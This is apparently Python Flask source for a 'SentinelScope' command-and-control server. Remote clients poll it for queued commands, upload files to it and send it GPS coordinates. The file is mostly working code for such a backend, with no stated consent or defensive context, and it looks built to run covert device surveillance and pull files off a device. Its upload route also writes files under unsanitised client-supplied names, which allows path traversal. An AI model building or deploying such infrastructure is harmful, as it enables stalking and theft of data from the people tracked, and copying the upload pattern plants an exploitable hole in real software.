from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/')
def home():
    return "SentinelScope Control Server Running"

# GLOBAL STATE
last_command = {"command": "none", "params": {}}

@app.route("/set_command", methods=["POST"])
def set_command():
    global last_command
    data = request.json or {}

    last_command = {
        "command": data.get("command", "none"),
        "params": data.get("params", {})
    }

    return {"status": "command set", "command": last_command}

@app.route("/get_command", methods=["GET"])
def get_command():
    global last_command

    cmd = last_command
    last_command = {"command": "none", "params": {}}

    return cmd

import os
from flask import request
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/upload_file", methods=["POST"])
def upload_file():
    file = request.files.get("file")

    if not file:
        return {"status": "no file"}, 400

    filepath = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(filepath)

    print(f"[📁 FILE RECEIVED] Saved to {filepath}")

    return {"status": "received"}

@app.route('/send_location', methods=['POST'])
def receive_location():
    data = request.json

    lat = data.get("lat")
    lon = data.get("lon")

    print(f"[📍 LOCATION RECEIVED] Lat: {lat}, Lon: {lon}")
    return jsonify({"status": "received"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)